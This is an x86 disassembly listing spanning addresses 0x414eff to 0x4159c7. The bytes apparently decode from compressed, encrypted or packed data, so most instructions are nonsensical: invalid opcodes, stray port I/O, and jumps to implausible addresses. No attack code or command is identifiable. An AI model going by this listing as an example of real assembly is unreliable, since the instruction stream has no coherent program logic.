  414eff:	push   ss
	...
  414f28:	add    BYTE PTR [eax],al
  414f2a:	mov    bh,0xa6
  414f2c:	sub    BYTE PTR [ecx+ebp*1],al
  414f2f:	mov    DWORD PTR [edi-0x5967e4a5],esi
  414f35:	jo     0x414ef3
  414f37:	sbb    bh,al
  414f39:	jo     0x414ebd
  414f3b:	pop    es
  414f3c:	imul   ebp,esi,0xd
  414f3f:	pop    esp
  414f40:	fiadd  WORD PTR [esi+0x70871219]
  414f46:	out    0xc8,al
  414f48:	jge    0x414fba
  414f4a:	lock test DWORD PTR [eax],eax
  414f4d:	jmp    0x6f39d6c0
  414f52:	dec    eax
  414f53:	les    ecx,FWORD PTR [ecx-0x58]
  414f56:	cmp    eax,0x4e5d7412
  414f5b:	xchg   DWORD PTR [eax],ecx
  414f5d:	inc    ecx
  414f5e:	adc    al,0x9d
  414f60:	std    
  414f61:	dec    esi
  414f62:	out    dx,al
  414f63:	mov    al,0xc7
  414f65:	sub    eax,DWORD PTR [ecx+0x5b]
  414f68:	push   ebx
  414f69:	jb     0x414f7c
  414f6b:	fcmovnb st,st(4)
  414f6d:	adc    eax,0x5cfe1126
  414f72:	js     0x414f8a
  414f74:	push   ecx
  414f75:	es nop
  414f77:	data16 std 
  414f79:	aam    0xfa
  414f7b:	cdq    
  414f7c:	aas    
  414f7d:	jmp    0xe9727567
  414f82:	cmp    eax,0xc0f6c066
  414f87:	sar    edi,0xe8
  414f8a:	cmp    eax,0xf1441a
	...
  414fb7:	add    BYTE PTR [ebx+ebx*2],bh
  414fba:	add    cl,ch
  414fbc:	not    BYTE PTR [esi+0x5b41e6f4]
  414fc2:	add    BYTE PTR [ebx+0x3a],dl
  414fc5:	test   DWORD PTR [eax],eax
  414fc7:	inc    ebx
  414fc8:	inc    edx
  414fc9:	test   DWORD PTR [eax],eax
  414fcb:	pop    esp
  414fcc:	ja     0x414fdc
  414fce:	push   ecx
  414fcf:	je     0x414f98
  414fd1:	or     eax,0xa2a1bef6
  414fd6:	std    
  414fd7:	cmp    al,0x9a
  414fd9:	adc    DWORD PTR [ebp+ebp*4-0x7e],esi
  414fdd:	lock xor cl,ch
  414fe0:	cmp    eax,0x4715c066
  414fe5:	add    al,0x73
  414fe7:	call   0x6ea9ab29
  414fec:	ret    0x9a
  414fef:	add    al,al
  414ff1:	adc    ecx,DWORD PTR [edx]
  414ff3:	call   0x4069b8
  414ff8:	inc    edi
  414ff9:	xchg   esi,eax
  414ffa:	int    0x8d
  414ffc:	pop    edx
  414ffd:	xchg   ebx,eax
  414ffe:	idiv   bh
  415000:	pusha  
  415001:	daa    
  415002:	push   eax
  415003:	call   0x406a18
  415008:	pop    esi
  415009:	in     al,0xd9
  41500b:	div    DWORD PTR [eax-0x7e]
  41500e:	in     eax,0x35
  415010:	jmp    0x414f92
  415012:	(bad)  
  415013:	push   0xffffffa7
  415015:	xor    eax,0x5dd668d0
  41501a:	std    
  41501b:	mov    ch,0x0
	...
  415045:	add    BYTE PTR [ebx],dh
  415047:	mov    bh,dh
  415049:	jmp    DWORD PTR [eax+0x54]
  41504c:	ror    DWORD PTR [eax-0x1a],0x5d
  415050:	call   0xfec2288a
  415055:	mov    DWORD PTR [edx],ebx
  415057:	xchg   esi,esi
  415059:	inc    DWORD PTR [eax+0x35]
  41505c:	(bad)  
  41505d:	addr16 dec eax
  41505f:	das    
  415060:	inc    ecx
  415061:	add    BYTE PTR [eax-0x2e],dh
  415064:	fincstp 
  415066:	push   eax
  415067:	cmp    dh,0x35
  41506a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41506b:	aad    0x40
  41506d:	add    BYTE PTR [edi+0x68],ch
  415070:	inc    ebp
  415071:	push   DWORD PTR [eax-0x72]
  415074:	test   ah,ch
  415076:	push   0x276afe80
  41507b:	xor    eax,0x576668da
  415080:	std    
  415081:	mov    ch,0xd3
  415083:	mov    esi,edi
  415085:	call   eax
  415087:	push   ebx
  415088:	ror    DWORD PTR [eax+0x66],0x57
  41508c:	call   0xfec1aa8a
  415091:	mov    DWORD PTR [esi],edi
  415093:	jg     0x4150ee
  415095:	test   BYTE PTR [ecx],0xe2
  415098:	xlat   BYTE PTR ds:[ebx]
  415099:	jmp    DWORD PTR [ecx-0x1d]
  41509c:	fld    DWORD PTR [eax+0x3e]
  41509f:	xchg   ecx,eax
  4150a0:	mov    eax,0x6e89f1db
  4150a5:	(bad)  
  4150a6:	sub    eax,ebp
  4150a8:	mov    ecx,0x40
	...
  4150d1:	add    BYTE PTR [eax],al
  4150d3:	add    BYTE PTR [esi],bh
  4150d5:	stos   BYTE PTR es:[edi],al
  4150d6:	dec    edx
  4150d7:	inc    ebp
  4150d8:	shl    DWORD PTR [ecx-0x4e1d7b84],1
  4150de:	outs   dx,BYTE PTR ds:[esi]
  4150df:	(bad)  
  4150e0:	push   esp
  4150e1:	add    bl,dl
  4150e3:	in     eax,0x26
  4150e5:	ret    
  4150e6:	add    edi,edi
  4150e8:	jmp    0x415158
  4150ea:	jbe    0x4150ea
  4150ec:	test   eax,0xf6c33849
  4150f1:	ret    0xe801
  4150f4:	fcmovnb st,st(0)
  4150f6:	outs   dx,BYTE PTR ds:[esi]
  4150f7:	inc    bh
  4150f9:	ja     0x41515c
  4150fb:	test   BYTE PTR [ecx-0x6d437d97],0x69
  415102:	outs   dx,BYTE PTR ds:[esi]
  415103:	(bad)  
  415104:	ds mov ss,edx
  415107:	add    bl,BYTE PTR ds:[bx-0x43]
  41510c:	imul   ecx,DWORD PTR [edi-0x3ddb1807],0xef59fe6e
  415116:	je     0x41510e
  415118:	push   ecx
  415119:	xor    DWORD PTR [esp+esi*2+0x36],ebp
  41511d:	sbb    bh,BYTE PTR [edi+0x3f]
  415120:	inc    ecx
  415121:	and    DWORD PTR [esp+esi*4+0x2a],ebp
  415125:	shr    DWORD PTR [ebx-0x2],1
  415128:	xor    DWORD PTR [edi-0x4],eax
  41512b:	out    0xbe,eax
  41512d:	inc    ecx
  41512e:	imul   edi,esi,0x21
  415131:	xchg   DWORD PTR [esi+esi*8+0x19],ebx
  415135:	pop    ebx
  415136:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415137:	ins    DWORD PTR es:[edi],dx
	...
  415160:	add    BYTE PTR [eax],al
  415162:	mov    ah,BYTE PTR [ebx-0x71]
  415165:	repnz dec ecx
  415167:	adc    BYTE PTR [edi-0x69093593],dl
  41516d:	ins    DWORD PTR es:[edi],dx
  41516e:	clc    
  41516f:	paddw  mm7,mm3
  415172:	fnstenv [esi+0x27]
  415175:	ins    DWORD PTR es:[edi],dx
  415176:	call   0xe8a58e8a
  41517b:	movq   mm5,QWORD PTR [ebp+0x52]
  41517f:	arpl   WORD PTR [edi-0x2a],cx
  415182:	adc    DWORD PTR [eax],edx
  415184:	pop    edi
  415185:	ins    DWORD PTR es:[edi],dx
  415186:	xchg   edx,eax
  415187:	cs pop edi
  415189:	ins    DWORD PTR es:[edi],dx
  41518a:	ror    BYTE PTR [edi],0xd5
  41518d:	sti    
  41518e:	mov    eax,ds:0xb06d45da
  415193:	pcmpeqw mm2,QWORD PTR [eax-0x50]
  415197:	getsec 
  415199:	pop    esp
  41519a:	push   edi
  41519b:	pushf  
  41519c:	cs ins DWORD PTR es:[edi],dx
  41519e:	cwde   
  41519f:	lds    edx,FWORD PTR [edi]
  4151a1:	jne    0x415133
  4151a3:	movups xmm1,XMMWORD PTR ds:0x6d170ffd
  4151aa:	retf   0x16fe
  4151ad:	ins    DWORD PTR es:[edi],dx
  4151ae:	js     0x4151b2
  4151b0:	fadd   st(0),st
  4151b2:	jo     0x4151c3
  4151b4:	push   DWORD PTR [esi+0x6cf70761]
  4151ba:	pop    ecx
  4151bb:	popa   
  4151bc:	stos   BYTE PTR es:[edi],al
  4151bd:	ins    BYTE PTR es:[edi],dx
  4151be:	pop    eax
  4151bf:	setge  BYTE PTR [edi+0x48]
  4151c3:	pandn  mm3,QWORD PTR [ebx+0x0]
	...
  4151ef:	add    BYTE PTR [ebx-0x64],cl
  4151f2:	(bad)  
  4151f3:	ins    BYTE PTR es:[edi],dx
  4151f4:	inc    eax
  4151f5:	(bad)
  4151f8:	cmp    BYTE PTR [edi],cl
  4151fa:	shl    BYTE PTR [eax+0x7f],1
  4151fd:	push   cs
  4151fe:	mov    edi,0x113826c
  415203:	rcr    BYTE PTR ds:0xaaaefe11,0x87
  41520a:	cld    
  41520b:	xchg   ecx,eax
  41520c:	adc    bh,BYTE PTR [esi]
  41520e:	add    cl,ch
  415210:	inc    esp
  415211:	sbb    al,0x9
  415213:	jmp    0x6b2e3400
  415218:	adc    DWORD PTR [edx],0xa417e96b
  41521e:	std    
  41521f:	hlt    
  415220:	in     eax,0xf6
  415222:	add    ebp,DWORD PTR [ecx]
  415224:	push   ebx
  415225:	or     eax,0x764e2488
  41522a:	mov    cl,0xd1
  41522c:	cld    
  41522d:	push   cs
  41522e:	call   esp
  415230:	(bad)
  415233:	push   edi
  415234:	push   edx
  415235:	or     eax,0xd29d4fe
  41523a:	je     0x41522d
  41523c:	adc    eax,0x1a3e403e
  415241:	and    eax,ebx
  415243:	in     eax,dx
  415244:	cmp    eax,0xbe3d89a8
  415249:	sbb    dh,ch
  41524b:	mov    BYTE PTR es:[edx-0x18],ah
  41524f:	xchg   edi,eax
  415250:	sub    BYTE PTR [ebx+0x0],bl
  415253:	loop   0x415255
	...
  41527d:	add    ch,bh
  41527f:	xchg   BYTE PTR [eax+eiz*1],al
  415282:	jmp    DWORD PTR [ecx+0x0]
  415285:	push   es
  415286:	push   0x4887e85e
  41528b:	pop    ebx
  41528c:	add    dl,ah
  41528e:	std    
  41528f:	xchg   BYTE PTR [eax+eiz*1],al
  415292:	jmp    DWORD PTR [ecx+0x0]
  415295:	jo     0x415316
  415297:	push   es
  415298:	(bad)  
  415299:	push   esp
  41529a:	(bad)  
  41529c:	xchg   esp,eax
  41529d:	sub    edx,ebp
  41529f:	or     al,0x88
  4152a1:	and    al,0xa6
  4152a3:	or     eax,0x81fb0074
  4152a8:	je     0x4152a2
  4152aa:	call   0xbc2960ba
  4152af:	sar    dh,1
  4152b1:	call   FWORD PTR [edx+ebx*4]
  4152b4:	jno    0x4152f1
  4152b6:	mov    ds,WORD PTR [edx+esi*8]
  4152b9:	push   0x17
  4152bb:	xchg   ebx,eax
  4152bc:	inc    esp
  4152bd:	hlt    
  4152be:	inc    edi
  4152bf:	xor    BYTE PTR [esp+edi*8-0x41],0xaa
  4152c4:	push   0xffffffff
  4152c6:	mov    eax,0x174be0d
  4152cb:	xor    bh,dh
  4152cd:	(bad)  
  4152cf:	sar    dh,0x75
  4152d2:	fbstp  TBYTE PTR [ecx-0x7da7c10a]
  4152d8:	(bad)  
  4152d9:	jne    0x4152b6
  4152db:	xor    BYTE PTR [eax+ecx*1+0x7f],0xd1
  4152e0:	inc    DWORD PTR ds:[eax]
	...
  41530b:	add    BYTE PTR [eax],cl
  41530d:	xor    BYTE PTR [esp+esi*8-0x8],0xb
  415312:	cli    
  415313:	push   edx
  415315:	adc    esi,esp
  415317:	adc    al,0xa8
  415319:	cmp    dh,0xff
  41531c:	shl    BYTE PTR [ebp-0x1b],cl
  41531f:	and    eax,0xc9fe80e5
  415324:	push   ebp
  415325:	adc    edi,esi
  415327:	push   esp
  415328:	sbb    al,0xb3
  41532a:	add    ah,0x33
  41532d:	sub    edi,edi
  41532f:	jne    0x41539c
  415331:	mov    cl,0xee
  415333:	inc    esi
  415334:	push   0xe2c00a80
  415339:	pop    edx
  41533a:	pop    esi
  41533b:	leave  
  41533c:	and    eax,0x228cfe13
  415341:	xchg   DWORD PTR [ebp-0x1],ecx
  415344:	repnz adc ah,dh
  415347:	mov    eax,ds:0xfe693d3e
  41534c:	inc    ebp
  41534d:	ret    0x83fa
  415350:	push   ds
  415351:	add    eax,DWORD PTR [edx]
  415353:	add    BYTE PTR [ecx],ch
  415355:	dec    eax
  415356:	push   0x69403ae7
  41535b:	inc    bh
  41535d:	aaa    
  41535e:	pop    eax
  41535f:	dec    BYTE PTR [ebx+0x1a746ab6]
  415365:	out    dx,al
  415366:	lock not DWORD PTR [esi]
  415369:	sbb    esp,eax
  41536b:	(bad)  
  41536c:	stc    
  41536d:	jns    0x41535f
  41536f:	jmp    0x415371
	...
  415399:	add    bh,ah
  41539b:	mov    eax,ds:0x6a3e0001
  4153a0:	cli    
  4153a1:	push   0xe7d0027f
  4153a6:	mov    esp,ecx
  4153a8:	add    DWORD PTR [eax],eax
  4153aa:	inc    ebp
  4153ab:	inc    edx
  4153ac:	lock add al,0xd7
  4153af:	fiadd  DWORD PTR [ecx]
  4153b1:	add    BYTE PTR [esi],bh
  4153b3:	jns    0x415426
  4153b5:	addr16 dec eax
  4153b7:	sbb    eax,ebp
  4153b9:	call   FWORD PTR [ecx+0x3e001588]
  4153bf:	add    DWORD PTR [edx-0x78],esi
  4153c2:	sub    ebx,DWORD PTR [edx-0x3cd8e227]
  4153c8:	add    DWORD PTR [esi-0x5a],edx
  4153cb:	sub    BYTE PTR [eax],bl
  4153cd:	add    BYTE PTR [esi],bh
  4153cf:	or     DWORD PTR [edx+0x74],eax
  4153d2:	cmp    al,0x59
  4153d4:	out    dx,eax
  4153d5:	mov    DWORD PTR [esi+0x7a],ecx
  4153d8:	shl    dl,1
  4153da:	(bad)  
  4153db:	mov    edi,0xeb1e675d
  4153e0:	(bad)  
  4153e1:	dec    DWORD PTR [ebx]
  4153e3:	pop    edx
  4153e4:	adc    al,0x2e
  4153e6:	ds add bh,bh
  4153e9:	mov    edi,0x5ce95acb
  4153ee:	jmp    0x2882:0x21dcd7df
  4153f5:	add    al,0x26
  4153f7:	pushf  
  4153f8:	sti    
  4153f9:	add    edi,DWORD PTR [esi]
  4153fb:	pop    eax
  4153fc:	mov    bh,0x7b
	...
  415426:	add    BYTE PTR [eax],al
  415428:	mov    dl,0x2f
  41542a:	push   eax
  41542b:	or     dl,BYTE PTR [edi+0x21d1e79a]
  415431:	cld    
  415432:	cld    
  415433:	add    edi,DWORD PTR [esi]
  415435:	pusha  
  415436:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415437:	out    dx,eax
  415438:	aas    
  415439:	add    bl,ah
  41543b:	jge    0x41546e
  41543d:	jecxz  0x41547b
  41543f:	push   ecx
  415440:	(bad)  
  415441:	xchg   ebp,eax
  415442:	scas   eax,DWORD PTR es:[edi]
  415443:	jge    0x4154bf
  415445:	imul   DWORD PTR [ebp+0x24e03e04]
  41544b:	dec    esp
  41544c:	sti    
  41544d:	pop    edx
  41544e:	out    0x68,eax
  415450:	push   edx
  415451:	das    
  415452:	outs   dx,DWORD PTR ds:[esi]
  415453:	out    dx,eax
  415454:	(bad)  [ebx]
  415456:	(bad)  
  415458:	loope  0x415441
  41545a:	pop    ebp
  41545b:	imul   eax,eax,0xc464bce0
  415461:	xchg   ebp,eax
  415462:	inc    ebx
  415463:	jl     0x4154a6
  415465:	loope  0x415403
  415467:	push   eax
  415468:	mov    ah,0x95
  41546a:	pop    ds
  41546b:	jl     0x41549e
  41546d:	fcomi  st,st(5)
  41546f:	add    ecx,DWORD PTR [ecx-0x2a]
  415472:	xchg   ebx,eax
  415473:	push   0xef270b90
  415478:	xchg   ebp,eax
  415479:	add    cl,al
  41547b:	ret    0xb80
  41547e:	gs mov edi,0xb8ffaa69
  415484:	clc    
  415485:	or     eax,DWORD PTR [edi]
  415487:	pop    ebp
  415488:	imul   ebp,DWORD PTR [ebp+0x4630],0x0
	...
  4154b6:	xor    eax,0xda9c005b
  4154bb:	(bad)  
  4154bc:	std    
  4154bd:	je     0x415508
  4154bf:	repz pop ebx
  4154c1:	sub    al,0xd7
  4154c3:	or     al,0xa
  4154c5:	test   eax,0xd8684251
  4154ca:	adc    eax,0x9239009c
  4154cf:	repz inc esp
  4154d1:	(bad)  
  4154d2:	xchg   esi,eax
  4154d3:	call   0x4100:0x4a8c3e68
  4154da:	inc    edx
  4154db:	pop    ebx
  4154dc:	in     eax,dx
  4154dd:	outs   dx,DWORD PTR ds:[esi]
  4154de:	cmc    
  4154df:	pop    esp
  4154e0:	sub    BYTE PTR [bp+si-0x55],al
  4154e4:	std    
  4154e5:	adc    al,0x2
  4154e7:	add    esp,DWORD PTR ds:0xe9096701
  4154ed:	mov    cl,0xfd
  4154ef:	or     esi,edi
  4154f1:	mov    al,0x83
  4154f3:	bound  eax,QWORD PTR [eax]
  4154f5:	adc    al,0x63
  4154f7:	test   BYTE PTR [ecx+0x7461ad],0x3
  4154fe:	nop
  4154ff:	or     DWORD PTR [ecx+esi*8+0x65],esi
  415503:	add    al,0x3c
  415505:	pop    esi
  415506:	push   esi
  415507:	rol    DWORD PTR [ebx+0x55],cl
  41550a:	fwait
  41550b:	fs std 
  41550d:	aam    0xb5
  41550f:	add    ah,BYTE PTR [esi+eax*2+0xa6b0916]
  415516:	pop    ss
  415517:	(bad)
	...
  415543:	add    dl,cl
  415545:	or     esi,edi
  415547:	cs jae 0x4155b0
  41554a:	std    
  41554b:	pushf  
  41554c:	test   DWORD PTR [edx],eax
  41554e:	nop
  41554f:	push   ds
  415550:	push   ss
  415551:	or     DWORD PTR [ecx-0x17],ebp
  415554:	cmp    eax,0xd981befa
  415559:	cmp    DWORD PTR [edi],0xf1265700
  41555f:	push   0x75fd5e96
  415564:	pop    edi
  415565:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415566:	(bad)  
  415567:	imul   esp,DWORD PTR [eax-0x7e],0x826375fe
  41556e:	je     0x415578
  415570:	outs   dx,DWORD PTR ds:[esi]
  415571:	je     0x4155af
  415573:	call   DWORD PTR [eax]
  415575:	dec    eax
  415576:	mov    edi,0x8b2b2704
  41557b:	in     al,dx
  41557c:	xchg   esi,eax
  41557d:	fwait
  41557e:	aad    0xf7
  415580:	loopne 0x415503
  415582:	mov    WORD PTR [ebp-0x2d],es
  415585:	push   DWORD PTR cs:[ebp-0xd]
  415589:	xor    BYTE PTR [eax+ecx*1-0x51],0xeb
  41558e:	sub    DWORD PTR [eax],eax
  415590:	pop    ss
  415591:	add    eax,0x9f6a0fbe
  415596:	add    BYTE PTR [eax],al
  415598:	out    0x48,eax
  41559a:	inc    esp
  41559b:	clc    
  41559c:	xlat   BYTE PTR ds:[ebx]
  41559d:	pop    ebp
  41559e:	add    BYTE PTR [eax],al
  4155a0:	cwde   
  4155a1:	sbb    esi,edx
  4155a3:	(bad)  
  4155a4:	call   0xab5606
	...
  4155d1:	add    bh,ah
  4155d3:	and    edi,esi
  4155d5:	imul   edx,edi,0x9a8cfe23
  4155db:	jns    0x41562a
  4155dd:	lea    ebp,[edx]
  4155df:	mov    esi,esi
  4155e1:	inc    DWORD PTR [eax]
  4155e3:	das    
  4155e4:	push   DWORD PTR [ebp-0x1]
  4155e7:	xor    DWORD PTR [esp+edi*8+0xf],0xa7002a2a
  4155ef:	add    al,0xbe
  4155f1:	je     0x41558d
  4155f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4155f4:	add    BYTE PTR [ecx],0x97
  4155f7:	pop    ebp
  4155f8:	push   0xfe1ecf9f
  4155fd:	(bad)  
  4155fe:	ds out 0xf5,eax
  415601:	out    0xb6,eax
  415603:	mov    ah,0x66
  415605:	dec    BYTE PTR [esi]
  415607:	lea    edx,[esp+ecx*4-0x45]
  41560b:	movq   mm7,mm6
  41560e:	pop    ecx
  41560f:	jecxz  0x4155e0
  415611:	out    0xa6,eax
  415613:	mov    ah,0x66
  415615:	(bad)  
  415616:	mov    bh,0x76
  415618:	dec    ecx
  415619:	test   BYTE PTR [ecx+0x28],0x5a
  41561d:	std    
  41561e:	jns    0x415651
  415620:	imul   edi,DWORD PTR ds:0xb89a,0x66f27f68
  415629:	mov    ah,0x6
  41562b:	shl    BYTE PTR [esi-0x2],cl
  41562e:	sbb    DWORD PTR [eax-0x4],ecx
  415631:	out    0x3f,eax
  415633:	xor    eax,0xfe65
	...
  415660:	mov    bh,0x77
  415662:	jno    0x41565a
  415664:	add    edx,ebp
  415666:	xlat   BYTE PTR ds:[ebx]
  415667:	jmp    DWORD PTR [ecx+0x47]
  41566a:	fild   DWORD PTR [eax+0x3e]
  41566d:	fnstenv [eax+0x66e1f1d7]
  415673:	(bad)  
  415674:	imul   ecx,DWORD PTR [edx],0x5a
  415677:	in     eax,0x7c
  415679:	xchg   ecx,eax
  41567a:	data16 mov BYTE PTR [ebx-0x3601917a],bh
  415681:	sub    al,0x2
  415683:	push   0xffc52b60
  415688:	mov    eax,0xb1f649e7
  41568d:	cdq    
  41568e:	data16 je 0x4156c7
  415691:	stos   BYTE PTR es:[edi],al
  415692:	cmp    al,BYTE PTR [ecx-0x5f]
  415695:	dec    ecx
  415696:	jl     0x41561c
  415698:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415699:	dec    ecx
  41569a:	data16 inc bl
  41569d:	jg     0x4156e4
  41569f:	test   BYTE PTR [ecx+0x19d3265b],0x80
  4156a6:	nop
  4156a7:	les    edi,FWORD PTR [ecx+0x9]
  4156aa:	pop    ebp
  4156ab:	dec    ebx
  4156ac:	push   0xf2660f08
  4156b1:	push   edx
  4156b2:	setp   bh
  4156b5:	pop    es
  4156b6:	(bad)  
  4156b7:	jnp    0x41567b
  4156b9:	(bad)  
  4156ba:	(bad)  
  4156bb:	gs push eax
  4156bd:	jne    0x4156a6
  4156bf:	fcmovne st,st(7)
  4156c1:	jno    0x4156eb
  4156c3:	add    al,0x0
	...
  4156ed:	add    BYTE PTR [ecx-0x32],al
  4156f0:	mov    edi,0xd708386d
  4156f5:	out    dx,eax
  4156f6:	cmp    ebx,esi
  4156f8:	ja     0x4156bc
  4156fa:	sub    BYTE PTR [eax],cl
  4156fc:	jno    0x41577d
  4156fe:	add    DWORD PTR [eax],edx
  415700:	mov    edi,0xb7c5bc65
  415705:	ins    DWORD PTR es:[edi],dx
  415706:	adc    BYTE PTR [eax],cl
  415708:	call   0x651debfc
  41570d:	pop    eax
  41570e:	or     BYTE PTR [eax],cl
  415710:	lahf   
  415711:	add    al,0x72
  415713:	jge    0x41577f
  415715:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415716:	(bad)  [edi]
  415718:	(bad)  
  415719:	gs jmp 0xe21d77aa
  41571f:	pop    es
  415720:	(bad)  
  415721:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415722:	fmul   DWORD PTR [ebp+0x43d45bd7]
  415728:	outs   dx,BYTE PTR ds:[esi]
  415729:	gs enter 0x57cd,0x6d
  41572e:	rol    BYTE PTR [edi],0x5f
  415731:	out    dx,eax
  415732:	dec    ecx
  415733:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415735:	daa    
  415736:	mov    cl,0x7
  415738:	dec    edi
  415739:	scas   eax,DWORD PTR es:[edi]
  41573a:	xchg   ebp,eax
  41573b:	cmova  esp,DWORD PTR [ebp-0x60]
  41573f:	(bad)  
  415740:	xlat   BYTE PTR ds:[ebx]
  415741:	pop    ebx
  415742:	inc    BYTE PTR [esi+0x0]
  415745:	sbb    ecx,DWORD PTR ss:[ecx]
  415748:	mov    ah,0x41
  41574a:	sbb    ecx,DWORD PTR [ecx]
  41574c:	(bad)  
  41574d:	es xchg ecx,eax
  41574f:	push   edi
  415750:	call   0x41582f
	...
  415779:	add    BYTE PTR [eax],al
  41577b:	add    BYTE PTR [ecx],ah
  41577d:	or     dh,bh
  41577f:	push   ss
  415780:	mov    eax,ds:0xe30ef623
  415785:	or     BYTE PTR [ebp+ecx*1-0x101f72d],dh
  41578c:	push   0x26fae857
  415791:	or     dh,bh
  415793:	out    dx,al
  415794:	cwde   
  415795:	daa    
  415796:	mul    dh
  415798:	fimul  DWORD PTR [eax]
  41579a:	je     0x415795
  41579c:	xchg   ebp,eax
  41579d:	imul   edi,DWORD PTR [esi+edx*8],0xffffff9a
  4157a1:	add    eax,0xcfa2f974
  4157a6:	fdivr  DWORD PTR [esi+0x34fe059a]
  4157ac:	sbb    bh,bh
  4157ae:	jb     0x415767
  4157b0:	call   0xfe0d:0x7574fe05
  4157b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4157b8:	gs cld 
  4157ba:	ds sahf 
  4157bc:	bound  eax,QWORD PTR ds:0x56299b4
  4157c2:	inc    BYTE PTR [ecx-0x7902b786]
  4157c8:	pop    edx
  4157c9:	iret   
  4157ca:	in     al,dx
  4157cb:	jbe    0x41582f
  4157cd:	add    eax,0x61ba5e9
  4157d2:	(bad)  
  4157d3:	outs   dx,BYTE PTR ds:[esi]
  4157d4:	cwde   
  4157d5:	(bad)  
  4157d6:	cmc    
  4157d7:	pop    dx
  4157d9:	(bad)  
  4157da:	mov    edi,0xfe05231f
  4157df:	pushf  
	...
  415808:	add    BYTE PTR [eax],al
  41580a:	adc    DWORD PTR ds:0xd0054efe,ecx
  415810:	ds add al,bh
  415813:	jle    0x415813
  415815:	mov    ch,0x7
  415817:	ja     0x415817
  415819:	(bad)  
  41581a:	jmp    edx
  41581c:	cmp    edi,edi
  41581e:	pop    eax
  41581f:	jg     0x415865
  415821:	clc    
  415822:	cs iret 
  415824:	sti    
  415825:	call   FWORD PTR [eax+0x7f]
  415828:	je     0x415826
  41582a:	aas    
  41582b:	inc    edi
  41582c:	daa    
  41582d:	add    BYTE PTR [edi+0x41],dl
  415830:	mov    edi,0x8b15570c
  415835:	in     al,dx
  415836:	in     al,0x45
  415838:	stc    
  415839:	push   0x67
  41583b:	and    al,0x4b
  41583d:	call   edx
  41583f:	add    esi,esp
  415841:	mov    ebp,0x89fe7a1c
  415846:	bound  edi,QWORD PTR [ebx-0x2]
  415849:	jne    0x41586a
  41584b:	repnz and eax,0xfd5f5669
  415851:	xor    eax,0x4116d4
  415856:	out    dx,eax
  415857:	mov    ds:0x79c8fffc,al
  41585c:	je     0x415866
  41585e:	jg     0x415897
  415860:	addr16 inc ecx
  415862:	pop    ss
  415863:	repnz (bad) 
  415865:	jmp    edi
  415867:	fxam   
  415869:	loop   0x415835
  41586b:	jns    0x41586b
  41586d:	inc    DWORD PTR [eax]
	...
  415897:	add    BYTE PTR [edx+0x7b],dl
  41589a:	(bad)  
  41589b:	jne    0x41588c
  41589d:	jno    0x41586c
  41589f:	cmp    ebx,DWORD PTR [eax+0x7a]
  4158a2:	enter  0xe3c2,0x59
  4158a6:	push   ebx
  4158a7:	mov    ecx,DWORD PTR [ebx-0x22]
  4158aa:	sar    esp,0xed
  4158ad:	pop    ecx
  4158ae:	push   0x4c
  4158b0:	sbb    BYTE PTR [esi+eax*1],ah
  4158b3:	call   0xff6080f6
  4158b8:	test   eax,0x16fbc77a
  4158bd:	hlt    
  4158be:	add    edi,ebp
  4158c0:	fsubr  DWORD PTR [ebx]
  4158c2:	jecxz  0x41592c
  4158c4:	push   ebx
  4158c6:	jmp    0x1f47054
  4158cb:	dec    DWORD PTR [ebx]
  4158cd:	or     al,0x6a
  4158cf:	pop    esi
  4158d0:	loope  0x415936
  4158d2:	popa   
  4158d3:	(bad)  
  4158d4:	jmp    0x415945
  4158d6:	popa   
  4158d7:	je     0x41590f
  4158d9:	pop    esp
  4158da:	ja     0x415916
  4158dc:	popa   
  4158dd:	pop    esp
  4158de:	dec    ebx
  4158df:	rol    DWORD PTR [edx-0xc],0xb8
  4158e3:	mov    ah,BYTE PTR [edx+0x72]
  4158e6:	dec    eax
  4158e7:	iret   
  4158e8:	push   ecx
  4158e9:	hlt    
  4158ea:	bound  ecx,QWORD PTR [ebx+edi*8-0x4c014e01]
  4158f1:	mul    BYTE PTR [edx+0x74]
  4158f4:	inc    esi
  4158f5:	sbb    dh,BYTE PTR [ecx]
  4158f7:	sub    bh,BYTE PTR [esi]
  4158f9:	repnz push cs
  4158fb:	rol    BYTE PTR [eax],0x0
	...
  415926:	xor    DWORD PTR [edi-0x8],esi
  415929:	add    DWORD PTR [esi],edi
  41592b:	repnz dec edx
  41592d:	inc    esp
  41592e:	push   ss
  41592f:	repz add DWORD PTR [eax],eax
  415932:	ds mov ebp,0xf601f3c8
  415938:	add    DWORD PTR [eax],eax
  41593a:	fs bnd jmp 0x41593d
  41593e:	addr16 bnd jmp 0x415941
  415942:	mov    edx,0xb34f583f
  415947:	ja     0x41599e
  415949:	neg    cl
  41594b:	test   DWORD PTR [ecx+0x628a4bfe],esi
  415951:	je     0x41591d
  415953:	fisub  DWORD PTR [edx+0x28]
  415956:	ds pop ebx
  415958:	out    0xe,eax
  41595a:	jle    0x4158eb
  41595c:	in     al,0x6c
  41595e:	mov    DWORD PTR [edx-0x19],ebx
  415961:	add    edx,DWORD PTR [esi]
  415963:	in     al,0x9f
  415965:	les    esp,FWORD PTR [ecx-0x59f042fb]
  41596b:	stos   DWORD PTR es:[edi],eax
  41596c:	test   al,0x62
  41596e:	nop
  41596f:	stos   DWORD PTR es:[edi],eax
  415970:	bound  esi,QWORD PTR [ebx]
  415972:	mov    edx,0x805a33de
  415977:	add    al,0xb8
  415979:	mov    ch,0x61
  41597b:	fwait
  41597c:	test   al,0x62
  41597e:	jo     0x415952
  415980:	ins    BYTE PTR es:[edi],dx
  415981:	cmp    esi,DWORD PTR [eax+0x4]
  415984:	packssdw mm1,mm3
  415987:	inc    esi
  415988:	push   es
  415989:	bound  eax,QWORD PTR [eax]
	...
  4159b3:	add    bh,ah
  4159b5:	pop    edx
  4159b6:	(bad)  
  4159b7:	xchg   esp,eax
  4159b8:	out    0x99,al
  4159ba:	out    0x62,eax
  4159bc:	xchg   edx,eax
  4159bd:	and    esi,edi
  4159bf:	popa   
  4159c0:	inc    eax
  4159c1:	add    al,0x5d
  4159c3:	or     al,0x26
  4159c5:	loop   0x4159ee
  4159c7:	popa   
